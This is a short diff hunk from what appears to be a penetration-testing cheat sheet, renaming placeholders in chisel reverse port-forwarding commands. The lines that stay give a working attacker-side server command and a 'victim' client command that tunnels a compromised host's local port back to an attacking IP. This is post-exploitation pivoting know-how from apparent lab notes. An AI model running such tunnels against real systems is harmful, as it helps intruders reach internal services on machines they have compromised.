@@ -213,7 +213,7 @@ Format  = ./chisel server -p <PortForServer> --reverse
 ./chisel server -p 43022 --reverse
 
 On Victim:
-Format = ./chisel client <AttackingIP>:<PortForServer> R:<PortOfAttackingMachineYouWanttoAccess>:127.0.0.1:<PortOfVictimMachineYouNeedToForward>
+Format = ./chisel client <AttackingIP>:<PortForServer> R:<KaliPort>:127.0.0.1:<VictimPort>
 ./chisel client 192.168.49.139:43022 R:43023:127.0.0.1:43022
 
 ========
